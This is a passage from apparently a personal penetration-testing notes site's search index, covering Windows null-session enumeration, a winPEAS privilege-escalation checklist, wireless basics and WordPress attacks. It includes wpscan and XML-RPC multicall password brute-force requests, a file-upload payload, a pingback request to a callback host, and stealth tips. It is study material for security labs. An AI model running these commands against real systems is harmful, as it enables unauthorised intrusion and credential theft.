SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.</li> <li><code>Remote execution via MSF</code>: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.</li> <li><code>Other Protocols</code>: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.</li> </ul>","tags":["pentesting","windows"]},{"location":"windows-footprinting/#cmd-or-powershell","title":"cmd or powershell","text":"<p>CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET.</p> <p>New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output.</p> <p>Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host.</p> <p>Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host.</p> <p>If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7.</p> <p>Use\u00a0<code>CMD</code>\u00a0when:</p> <ul> <li>You are on an older host that may not include PowerShell.</li> <li>When you only require simple interactions/access to the host.</li> <li>When you plan to use simple batch files, net commands, or MS-DOS native tools.</li> <li>When you believe that execution policies may affect your ability to run scripts or other actions on the host.</li> </ul> <p>Use\u00a0<code>PowerShell</code>\u00a0when:</p> <ul> <li>You are planning to utilize cmdlets or other custom-built scripts.</li> <li>When you wish to interact with .NET objects instead of text output.</li> <li>When being stealthy is of lesser concern.</li> <li>If you are planning to interact with cloud-based services and hosts.</li> <li>If your scripts set and use Aliases.</li> </ul>","tags":["pentesting","windows"]},{"location":"windows-null-session-attack/","title":"Windows Null session attack","text":"<p>It\u2019s used to enumerate info (password, system users, system groups. running system processes). A null session attack exploits an authentification vulnerability for Windows Administrative Shares. This lets an attacker connect to a local or remote share without authentification.</p>","tags":["pentesting windows"]},{"location":"windows-null-session-attack/#manually-from-windows","title":"Manually from Windows","text":"<ol> <li>Enumerate File Server services:    </li> </ol> <pre><code>nbtstat -A $ip \u00a0\n\n# ELS-WINXP \u00a0 &lt;00&gt; \u00a0 UNIQUE \u00a0 Registered\n# &lt;00&gt; tells us ELS-WINXP is a workstation.\n# &lt;20&gt; says that the file sharing service is up and running on the machine\n# UNIQUE tells us that this compiter must have only one IP address assigned\n</code></pre> <ol> <li>Enumerate Windows Shares. Once we spot a machine with the File Server service running, we can enumerate:</li> </ol> <pre><code>NET VIEW $ip\n</code></pre> <ol> <li>Verify if a null attack is possible by exploiting the IPC$ administrative share and trying to connect without valid credentials.</li> </ol> <pre><code>NET USE \\\\$ip\\IPC$ \u2018\u2019 /u:\u2019\u2019\n</code></pre> <p>This tells Windows to connect to the IPC$ share by using an empty password and a empty username. It only works with IPC$ (not c$).</p>","tags":["pentesting windows"]},{"location":"windows-null-session-attack/#manually-from-linux","title":"Manually from Linux","text":"<p>Using the samba suite: https://www.samba.org/</p> <ol> <li>Enumerate File Server services: </li> </ol> <pre><code>nmblookup -A $ip\n</code></pre> <ol> <li>Also with the smbclient we can enumerate the shares provides by a host:  </li> </ol> <pre><code>smbclient -L //$ip -N\n\n# -L\u00a0 Look at what services are available on a target\n# $ip\u00a0Prepend the two slahes\n# -N \u00a0Force the tool not to ask for a password\n</code></pre> <ol> <li>Connect:</li> </ol> <pre><code>smbclient \\\\$ip\\sharedfolder -N\n</code></pre> <p>Be careful, sometimes the shell removes the slashes and you need to escape them.</p> <ol> <li>Once connected you can browse with the smb command line. To see allowed commands: help </li> <li> <p>When you know the path of a file and you want to retrieve it:</p> <ul> <li>from kali:  <pre><code>smbget smb://$ip/SharedFolder/flag_1.txt\n</code></pre></li> <li>from  smb command line:  <pre><code>get flag_1.txt\n</code></pre></li> </ul> </li> <li> <p>To map users with permissions</p> </li> </ol> <pre><code>smbmap -H demo.ine.local\n</code></pre> <p>To get an specific file in a connection: get flag.txt</p>","tags":["pentesting windows"]},{"location":"windows-null-session-attack/#tricks","title":"Tricks","text":"<p>Enumerate users with enum4linux -U demo.ine.local</p> <p>Enumerate the permissions of users with smbmap -H demo.ine.local</p> <p>If some users are missing in the permission list, maybe they are accesible, try with:</p> <pre><code>smbclient -L //$ip\\&lt;user&gt; -N\n</code></pre>","tags":["pentesting windows"]},{"location":"windows-null-session-attack/#more-tools","title":"More tools","text":"<ul> <li>Winfo.</li> <li>enum.</li> <li>enum4linux.</li> <li>SAMRDump.</li> </ul>","tags":["pentesting windows"]},{"location":"windows-privilege-escalation-history/","title":"Windows: Privilege Escalation - Recently accessed files and executed commands","text":"<p>Check recently accessed files/executed commands. Mostly (default) our console history will be saved in </p> <pre><code>C:\\Users\\&lt;account_name&gt;\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt . \n</code></pre>","tags":["windows","privilege escalation"]},{"location":"winfo/","title":"Winfo","text":"<p>Winfo uses Null Session attacks to retrieve account and share information from Windows NT.</p>","tags":["pentesting windows"]},{"location":"winfo/#installation","title":"Installation","text":"<p>Download it from: https://packetstormsecurity.com/search/?q=winfo&amp;s=files.</p>","tags":["pentesting windows"]},{"location":"winfo/#basic-command","title":"Basic command","text":"<pre><code>winfo.exe $ip -n\n</code></pre>","tags":["pentesting windows"]},{"location":"winpeas/","title":"Windows Privilege Escalation Awesome Scripts: winPEAS","text":"<p>And that is exactly what winPEAS stands for: windows Privilege Escalation Awesome Scripts. </p> <p>Download it from https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS.</p>","tags":["windows","privilege escalation"]},{"location":"winpeas/#what-it-does","title":"What it does","text":"<ul> <li>Check the Local Windows Privilege Escalation checklist from book.hacktricks.xyz that I'm copypasting below.</li> <li>Provide information about how to exploit misconfigurations.</li> </ul> <p>In the github repo, you will see two files: a .bat and an .exe version.</p>","tags":["windows","privilege escalation"]},{"location":"winpeas/#checklist-for-local-windows-privilege-escalation","title":"Checklist for Local windows Privilege Escalation","text":"<p>Source: winPEAS README.md file.</p>","tags":["windows","privilege escalation"]},{"location":"winpeas/#system-info","title":"System Info","text":"<ul> <li> Obtain System information</li> <li> Search for kernel exploits using scripts.</li> <li> Use Google to search for kernel exploits</li> <li> Use searchsploit to search for kernel exploits</li> <li> Interesting info in env vars?</li> <li> Passwords in PowerShell history?</li> <li> Interesting info in Internet settings?</li> <li> Drives</li> <li> WSUS exploit?</li> <li> AlwaysInstallElevated?</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#loggingav-enumeration","title":"Logging/AV enumeration","text":"<ul> <li> Check Audit and WEF</li> <li> Check LAPS</li> <li> Check if WDigest is active</li> <li> LSA Protection?</li> <li> Credentials Guard</li> <li> Cached Credentials?</li> <li> Check if any AV</li> <li> AppLocker Policy?</li> <li> UAC</li> <li> User Privileges</li> <li> Check current user privilege</li> <li> Are you member of any privileged group</li> <li> Check if you have any of these tokens enabled: SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege?</li> <li> Users Sessions?</li> <li> Check users homes (access?)</li> <li> Check Password Policy</li> <li> What is inside the Clipboard?</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#network","title":"Network","text":"<ul> <li> Check current network informatio</li> <li> Check hidden local services restricted to the outside</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#running-processes","title":"Running Processes","text":"<ul> <li> Processes binaries file and folders permission</li> <li> Memory Password mining</li> <li> Insecure GUI apps</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#services","title":"Services","text":"<ul> <li> Can you modify any service</li> <li> Can you modify the binary that is executed by any service</li> <li> Can you modify the registry of any service</li> <li> Can you take advantage of any unquoted service binary path</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#applications","title":"Applications","text":"<ul> <li> Write permissions on installed applications</li> <li> Startup Applications</li> <li> Vulnerable Drivers</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#dll-hijacking","title":"DLL Hijacking","text":"<ul> <li> Can you write in any folder inside PATH?</li> <li> Is there any known service binary that tries to load any non-existant DLL?</li> <li> Can you write in any binaries folder?</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#network_1","title":"Network","text":"<ul> <li> Enumerate the network (shares, interfaces, routes, neighbours, ...)</li> <li> Take a special look at network services listening on localhost (127.0.0.1)</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#windows-credentials","title":"Windows Credentials","text":"<ul> <li> Winlogon.</li> <li> Windows Vault.</li> <li> Interesting DPAPI credentials.</li> <li> Passwords of saved Wifi networks.</li> <li> Interesting info in saved RDP Connections.</li> <li> Passwords in recently run commands.</li> <li> Remote Desktop Credentials Manager.</li> <li> AppCmd.exe exists.</li> <li> SCClient.exe.</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#files-and-registry-credentials","title":"Files and Registry (Credentials)","text":"<ul> <li> Putty: Creds.</li> <li> SSH keys in registry.</li> <li> Passwords in unattended files.</li> <li> Any SAM &amp; SYSTEM.</li> <li> Cloud credentials.</li> <li> McAfee SiteList.xml.</li> <li> Cached GPP Password?</li> <li> Password in IIS Web config file.</li> <li> Interesting info in web logs.</li> <li> Do you want to ask for credentials</li> <li> Interesting files inside the Recycle Bin.</li> <li> Other registry containing credentials.</li> <li> Inside Browser data.</li> <li> Generic password search.</li> <li> Tools.</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#leaked-handlers","title":"Leaked Handlers","text":"<ul> <li> Have you access to any handler of a process run by administrator?</li> </ul>","tags":["windows","privilege escalation"]},{"location":"winpeas/#pipe-client-impersonation","title":"Pipe Client Impersonation","text":"","tags":["windows","privilege escalation"]},{"location":"winspy/","title":"winspy - A tool to view windows properties in the system","text":"","tags":["pentesting","windows","thick client"]},{"location":"winspy/#installation","title":"Installation","text":"<p>Download it from https://www.catch22.net/software/winspy</p>","tags":["pentesting","windows","thick client"]},{"location":"winspy/#what-it-does","title":"What it does","text":"<p>Basically winspy allows us to \u00a0select and view the properties of any window in the system.  WinSpy is based around the Spy++ utility that ships with Microsoft Visual Studio.</p> <p>It allows us to retrieve passwords from password-edit controls.</p> <p>Here an example:</p> <p>![[Pasted image 20230201192438.png]]</p> <p>Another nice example:</p> <p>![[Pasted image 20230201192528.png]]</p> <p>Here a list of all windows properties that it retrieves:</p> <ul> <li>Window Class and Name.</li> <li>Window procedure address.</li> <li>All window styles and extended styles.</li> <li>Window properties (set using the SetProp API call).</li> <li>Complete Child and Sibling window relationships.</li> <li>Scrollbar positional information.</li> <li>Full window Class information.</li> <li>Retrieve passwords from password-edit controls!</li> <li>Edit window styles!</li> <li>Alter window captions!</li> <li>Show / Hide / Enable / Disable / Adjust any window in the system!</li> <li>Massively improved user-interface!</li> <li>View the complete system window hierarchy!</li> <li>Multi-monitor support!</li> <li>Now works correctly for all versions of Windows.</li> <li>Tree hierarchy now groups by process.</li> </ul>","tags":["pentesting","windows","thick client"]},{"location":"wireless-security/","title":"Wireless security","text":""},{"location":"wireless-security/#basic-concepts","title":"Basic concepts","text":"Name Explanation <code>MAC address</code> A unique identifier for the device's wireless adapter. <code>SSID</code> The network name, also known as the <code>Service Set Identifier</code> of the WiFi network. <code>Supported data rates</code> A list of the data rates the device can communicate. <code>Supported channels</code> A list of the <code>channels</code> (frequencies) on which the device can communicate. <code>Supported security protocols</code> A list of the security protocols that the device is capable of using, such as <code>WPA2</code>/<code>WPA3</code>. <p>Wired Equivalent Privacy: WEP</p> <p>Wi-Fi Protected Access: WPA</p>"},{"location":"wireless-security/#wep-challenge-response-handshake","title":"WEP Challenge-Response Handshake","text":"Step Who Description 1 <code>Client</code> Sends an association request packet to the WAP, requesting access. 2 <code>WAP</code> Responds with an association response packet to the client, which includes a challenge string. 3 <code>Client</code> Calculates a response to the challenge string and a shared secret key and sends it back to the WAP. 4 <code>WAP</code> Calculates the expected response to the challenge with the same shared secret key and sends an authentication response packet to the client. <p>Nevertheless, some packets can get lost, so the so-called CRC checksum has been integrated. Cyclic Redundancy Check (CRC) is an error-detection mechanism used in the WEP protocol to protect against data corruption in wireless communications. </p>"},{"location":"wireless-security/#encryption-protocols","title":"Encryption Protocols","text":"<p>We can use various encryption algorithms to protect the confidentiality of data transmitted over wireless networks. The most common encryption algorithms in WiFi networks are Wired Equivalent Privacy (<code>WEP</code>), WiFi Protected Access 2 (<code>WPA2</code>), and WiFi Protected Access 3 (<code>WPA3</code>).</p>"},{"location":"wireless-security/#wired-equivalent-privacy-wep","title":"Wired Equivalent Privacy: WEP","text":"<p>Very week with 63-bit and 128-bit encryption keys.</p> <p>WEP uses the RC4 cipher encryption algorithm, which makes it vulnerable to attacks.</p> <p>Passwords can be crack in minutes.</p> <p>Superseded by WPA in 2003</p>"},{"location":"wireless-security/#wi-fi-protected-access-wpa","title":"Wi-Fi Protected Access: WPA","text":"<p>Developed by Wi-Fi Alliance</p> <p>Massive security improvement over WEP with 256-bit encryption keys.</p> <p>Superseded by WPA2 in 2006.</p>"},{"location":"wmctrl/","title":"wmctrl","text":"<pre><code>sudo apt-get install wmctrl\n</code></pre> <pre><code>#!/bin/bash\nwmctrl -s 0\n/bin/bash\nfirefox https://enterprise.hackthebox.com/login &amp;\nobsidian &amp;\nGoogle Chrome &amp;\nriseup-vpn --start-vpn on \nsleep 5\nwmctrl -r /bin/bash -t 0\nwmctrl -r firefox -t 1\nwmctrl -r obsidian -t 2\nwmctrl -r riseup-vpn -t 3\nwmctrl -s 0\n</code></pre>"},{"location":"wordpress-pentesting/","title":"Pentesting wordpress","text":"","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#important-wordpress-files-and-directories","title":"Important wordpress files and directories","text":"<p>Login/Authentication</p> <ul> <li>/wp-login.php (This is usually changed to /login.php for security)</li> <li>/wp-admin/login.php</li> <li>/wp-admin/wp-login.php </li> <li>xmlrpc.php - (Extensible Markup Language - Remote Procedure Call) is a protocol that allows external applications and services to interact with a WordPress site programmatically. This has been replaced by the WordPress REST API.</li> </ul> <p>Directories</p> <ul> <li>/wp-content - Primary directory used to store plugins and themes.</li> <li>/wp-content/uploads/ - Directory where uploaded files are stored (Usually prone to directory listing).</li> <li>/wp-config.php - Contains information required by WordPress to connect to a database. (Contains database credentials)</li> </ul>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#enumeration","title":"Enumeration","text":"","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#dorking-techniques","title":"Dorking techniques","text":"<pre><code>inurl:\"/xmlrpc.php?rsd\" + scoping restrictions\n\nintitle:\"WordPress\" inurl:\"readme.html\" + scoping restrictions = general wordpress detection\n\nallinurl:\"wp-content/plugins/\" + scoping restrictions = general wordpress detection\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#wordpress-version","title":"Wordpress version","text":"<pre><code># Using curl for getting generator meta tag\ncurl -s -X GET https://example.com | grep '&lt;meta name=\"generator\"'\n\n# Using curl for getting version from src files \ncurl -s -X GET &lt;URL&gt; | grep http | grep -E '?ver' | sed -E 's,href==|src=,THIIIIS,g' | awk -F \"THIIIIS\" '{print $2}' | cut -d \"'\" -f2\n</code></pre> <p>Manual techniques</p> <ul> <li>Check WordPress Meta Generator Tag.</li> <li>Check the WordPress readme.html/license.txt file.</li> <li>Inspect HTTP response headers for version information (X-Powered-By).</li> <li>Check the login page for the WordPress version as it is usually displayed.</li> <li>Check the WordPress REST API and look for the version field in the JSON response (http://example.com/wp-json/)</li> <li>Analyze JS and CSS files for version information.</li> <li>Examine the WordPress changelog files with information on version updates. Look for files like changelog.txt or readme.txt in the WordPress directory</li> </ul>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#plugin-enumeration","title":"Plugin enumeration","text":"<pre><code># curl\ncurl -s -X GET http://example.com | sed 's/href=/\\n/g' | sed 's/src=/\\n/g' | grep 'wp-content/plugins/*' | cut -d\"'\" -f2\n\n# wpscan\nwpscan --url http://&lt;TARGET&gt; --plugins-detection passive\n# Modes: -mixed (default), -passive or -active\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#themes-enumeration","title":"Themes enumeration","text":"<pre><code># Using curl\ncurl -s -X GET http://example.com | sed 's/href=/\\n/g' | sed 's/src=/\\n/g' | grep 'themes' | cut -d\"'\" -f2\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#user-enumeration","title":"User enumeration","text":"<pre><code># Using curl\ncurl -s -I -X GET http://blog.inlanefreight.com/?author=1\n\n# json enumeration\ncurl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq\n\n# wpscan\nwpscan --url https://target.tld/domain --enumerate u\nwpscan --url https://target.tld/ -eu\n\n# Enumerate a range of users 1-100\nwpscan --url https://target.tld/ --enumerate u1-100\nwpscan --url http://46.101.13.204:31822 --plugins-detection passive\n</code></pre> <p>Manual method: users in wordpress have unique identifiers. Usually first user in wordpress has id 1. Second user, id 2. So in the browser you can write:</p> <pre><code>http://example.com/wordpressPath?author=1\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#nmap-enumeration","title":"nmap enumeration","text":"<pre><code># List nmap scripts related to wordpress\nls -la /usr/share/nmap/scripts | grep wordpress\n</code></pre> <p>Results:</p> <pre><code>-rw-r--r-- 1 root root  5061 Nov  1 22:10 http-wordpress-brute.nse\n-rw-r--r-- 1 root root 10866 Nov  1 22:10 http-wordpress-enum.nse\n-rw-r--r-- 1 root root  4641 Nov  1 22:10 http-wordpress-users.nse\n</code></pre> <p>Running one of them:</p> <pre><code># General enumeration\nsudo nmap -sS -sV --script=http-wordpress-enum &lt;TARGETwithnohttp&gt; \n\n# Plugins enumeration\nsudo nmap -sS -sV --script=http-wordpress-enum --script-args type=\"plugins\" &lt;TARGETwithnohttp&gt; -p 80,443\n\n# User enumeration\nsudo nmap -sS -sV --script=http-wordpress-users &lt;TARGETwithnohttp&gt; \n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#brute-force-attack-on-login","title":"Brute force attack on login","text":"<p>Usually, login form is located at example.com/wp-admin/login.php</p> <p>But sometimes, login form is hidden under a different path. There exist plugins to do so.</p> <pre><code># Brute force attack with passwords\nwpscan --url HOST/domain -usernames admin, webadmin  --password-attack wp-login -passwords filename.txt\n# -usernames: those users that you are going to brute force\n# --password-attack: your URI target (different in the case of the WP api\n# -passwords: path/to/dictionary.txt\n\n\nwpscan --url  &lt;targetURLnohttp&gt; -U admin -P /usr/share/wordlists/rockyou.txt   \n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#enumerating-files-and-folders","title":"Enumerating files and folders","text":"<pre><code># Using gobuster\ngobuster dir --url https://example.com --wordlist /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -b '404'\n</code></pre> <p>Check out if directory listing is enabled.</p>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#wordpress-xmlrpc-attacks","title":"WordPress xmlrpc attacks","text":"<p>XML-RPC on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site. The XML-RPC API that WordPress provides several key functionalities that include:</p> <ul> <li>Publish a post.</li> <li>Edit a post.</li> <li>Delete a post.</li> <li>Upload a new file (e.g. an image for a post).</li> <li>Get a list of comments.</li> <li>Edit comments.</li> </ul> <p>XML-RPC functionality is turned on by default since WordPress 3.5. Therefore, normal installation of wordpress allows us to perform two type of attacks:</p> <ul> <li>XML-rpc ping attacks.</li> <li>Brute force attack.</li> </ul> <p>Before attacking, we need to make sure that there exist XML-RPC servers on the wordpress installation:</p> <p>1. Ensure you have access to the xmlrpc.php file (usually at https://example.com/xmlrpc.php). </p> <p>2. Send a POST request: .</p> <pre><code>POST /xmlrpc.php HTTP/1.1\nHost: example.com\nContent-Length: 135\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;methodCall&gt; \n&lt;methodName&gt;system.listMethods&lt;/methodName&gt; \n&lt;params&gt;&lt;/params&gt; \n&lt;/methodCall&gt;\n</code></pre> <p></p> <p>Same request with curl would be:</p> <pre><code>curl -X POST -d \"&lt;?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?&gt; &lt;methodCall&gt; &lt;methodName&gt;system.listMethods&lt;/methodName&gt; &lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;\" http://example.com/xmlrpc.php\n</code></pre> <p>Normal response to this request would be listing all available methods.</p> <p>This is how you trigger the method blogger.getUsersBlogs:</p> <p></p>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#xml-rpc-brute-force-attack","title":"XML-RPC brute force attack","text":"<p>With wpscan:</p> <pre><code>wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://&lt;TARGET&gt;\n</code></pre> <p>Use BurpSuite Intruder to send this request:</p> <pre><code>POST /xmlrpc.php HTTP/1.1\nHost: example.com\nContent-Length: 235\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;methodCall&gt; \n&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; \n&lt;params&gt; \n&lt;param&gt;&lt;value&gt;\\{\\{your username\\}\\}&lt;/value&gt;&lt;/param&gt; \n&lt;param&gt;&lt;value&gt;\\{\\{your password\\}\\}&lt;/value&gt;&lt;/param&gt; \n&lt;/params&gt; \n&lt;/methodCall&gt;\n</code></pre> <p>You can also perform a single request, and brute force hundreds of passwords. For that you need to use both system.multicall and wp.getUsersBlogs methods:</p> <pre><code>POST /xmlrpc.php HTTP/1.1\nHost: example.com\nContent-Length: 1560\n\n&lt;?xml version=\"1.0\"?&gt;\n&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;\n\n&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;\n\n&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;\n\n&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;\n\n&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Username \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;\\{\\{ Your Password \\}\\}&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;\n\n&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#xml-rpc-uploading-a-file","title":"XML-RPC uploading a file","text":"<p>Using the correct credentials you can upload a file. In the response the path will appears (source for this: hacktricks):</p> <pre><code>&lt;?xml version='1.0' encoding='utf-8'?&gt;\n&lt;methodCall&gt;\n    &lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;\n    &lt;params&gt;\n        &lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\n        &lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\n        &lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\n        &lt;param&gt;\n            &lt;value&gt;\n                &lt;struct&gt;\n                    &lt;member&gt;\n                        &lt;name&gt;name&lt;/name&gt;\n                        &lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;\n                    &lt;/member&gt;\n                    &lt;member&gt;\n                        &lt;name&gt;type&lt;/name&gt;\n                        &lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;\n                    &lt;/member&gt;\n                    &lt;member&gt;\n                        &lt;name&gt;bits&lt;/name&gt;\n                        &lt;value&gt;&lt;base64&gt;&lt;![CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;\n                    &lt;/member&gt;\n                &lt;/struct&gt;\n            &lt;/value&gt;\n        &lt;/param&gt;\n    &lt;/params&gt;\n&lt;/methodCall&gt;\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#xml-rpc-pingback-attack-distributed-denial-of-service-ddos-attacks","title":"XML-RPC pingback attack: Distributed denial-of-service (DDoS) attacks","text":"<p>An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level).</p>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#xml-rpc-pingback-attack-cloudflare-protection-bypass","title":"XML-RPC pingback attack: Cloudflare Protection Bypass","text":"<p>An attacker executes the pingback.ping the method from a single affected WordPress installation which is protected by CloudFlare to an attacker-controlled public host (for example a VPS) in order to reveal the public IP of the target, therefore bypassing any DNS level protection.</p>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#xml-rpc-pingback-attack-xspa-cross-site-port-attack","title":"XML-RPC pingback attack: XSPA (Cross Site Port Attack)","text":"<p>An attacker can execute the pingback.ping the method from a single affected wordpress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.</p> <p>The following represents an simple example request using the Burpsuite Collaborator provided URL as callback:</p> <pre><code>POST /xmlrpc.php HTTP/1.1\nHost: example.com\nContent-Length: 303\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;methodCall&gt;\n&lt;methodName&gt;pingback.ping&lt;/methodName&gt;\n&lt;params&gt;\n&lt;param&gt;\n&lt;value&gt;&lt;string&gt;https://pdaskjdasas23fselrkfdsf.oastify.com/1562017983221-4377199190203&lt;/string&gt;&lt;/value&gt;\n&lt;/param&gt;\n&lt;param&gt;\n&lt;value&gt;&lt;string&gt;https://example.com/&lt;/string&gt;&lt;/value&gt;\n&lt;/param&gt;\n&lt;/params&gt;\n&lt;/methodCall&gt;\n</code></pre> <pre><code># Brute force with curl\ncurl -X POST -d \"&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;\" http://blog.inlanefreight.com/xmlrpc.php\n\n# If the credentials are not valid, we will receive a 403 faultCode error.\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#rce-attack-on-wordpress","title":"RCE attack on wordpress","text":"<p>Once you have credentials for user admin, access the admin panel and introduce 